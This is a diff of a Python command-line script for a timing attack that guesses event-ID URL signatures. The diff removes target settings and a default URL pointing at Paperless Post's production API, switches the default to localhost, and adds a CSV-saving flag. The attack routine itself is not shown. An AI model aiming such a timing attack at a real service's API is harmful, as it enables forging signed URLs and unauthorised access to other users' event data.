@@ -9,14 +9,6 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 logging.basicConfig()
 logger = logging.getLogger('logger')
 
-
-# input_attack_endpoint = 'https://local.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
-# input_eventid = 19295929
-# input_signature = '7b9c70cf'
-
-# input_attack_endpoint = 'https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
-# input_eventid = 19295929
-# input_signature = '7b9c70cf'
 input_signature_seed = None
 input_attack_endpoint = None
 input_eventid = None
@@ -119,7 +111,7 @@ def run_attack():
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Timing attack against event id url signatures.')
-    parser.add_argument('-u', action='store', dest='url', default='https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}',
+    parser.add_argument('-u', action='store', dest='url', default='http://localhost:5000/events/{0}/{1}/',
                         help='The target url.')
     parser.add_argument('-i', action='store', dest='iterations', default='2',
                         help='The # of iterations to perform per byte. Default is 2.')
@@ -128,6 +120,8 @@ if __name__ == "__main__":
                         help='The # of bytes to guess. Default is 8.')
     parser.add_argument('-e', action='store', dest='eventid', default='19295929',
                         help='The EventID. Default is 19295929.')
+    parser.add_argument('-f', action='store_true', dest='csv', default=False,
+                        help='Save data to CSVs.')                          
     parser.add_argument('-v', action='store_true', dest='verbose', default=False,
                         help='Log to console in debug.')                                
     parser.add_argument('--version', action='version', version='%(prog)s 1.0')
@@ -141,15 +135,23 @@ if __name__ == "__main__":
         logger.setLevel(logging.INFO)
         logger.debug("Logging in info mode.")
 
-    logger.debug("url: {0}".format(args.url))
-    logger.debug("iterations: {0}".format(args.iterations))
-    logger.debug("bytes: {0}".format(args.bytes))
-    logger.debug("event_id: {0}".format(args.eventid))    
+    if args.csv:
+        SAVE_TO_CSV = True
+
+    logger.debug("args url: {0}".format(args.url))
+    logger.debug("args iterations: {0}".format(args.iterations))
+    logger.debug("args bytes: {0}".format(args.bytes))
+    logger.debug("args event_id: {0}".format(args.eventid))    
+
     input_signature_seed = ['0'] * int(args.bytes)
-    logger.debug("Signature_SEED: {0}".format(input_signature_seed))
     input_eventid = int(args.eventid)
     input_attack_endpoint = args.url
     input_iterations = int(args.iterations)
+
+    logger.debug("input_iterations: {0}".format(input_iterations))
+    logger.debug("input_eventid: {0}".format(input_eventid))
+    logger.debug("input_attack_endpoint: {0}".format(input_attack_endpoint))   
+    logger.debug("input_signature_seed: {0}".format(input_signature_seed))
 
     run_attack()
 
